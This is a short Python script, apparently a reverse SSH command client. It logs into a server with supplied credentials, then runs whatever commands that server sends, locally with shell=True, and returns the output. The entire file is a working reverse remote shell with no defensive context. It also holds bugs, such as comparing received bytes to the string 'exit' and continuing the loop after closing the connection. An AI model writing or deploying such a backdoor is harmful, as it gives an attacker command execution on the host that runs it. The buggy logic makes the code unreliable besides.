import paramiko
import shlex
import subprocess

def ssh_command(ip, port, user, passwd, command):

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if command == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or 'OK')
            except Exception as e:
                ssh_session.send(str(e))
                client.close()        
    return

if __name__ == '__main__':
    try:
        import getpass
        user = input('User: ')
        #user = getpass.getuser()
        password = getpass.getpass()
        ip = input('Server IP: ')
        port = input('Port: ')

        ssh_command(ip, port, user, password, 'Client Connected')
    except KeyboardInterrupt:
        print("\n[!] Process terminated by user")
    except Exception as e:
        print("[!!] An error occured:\n", e)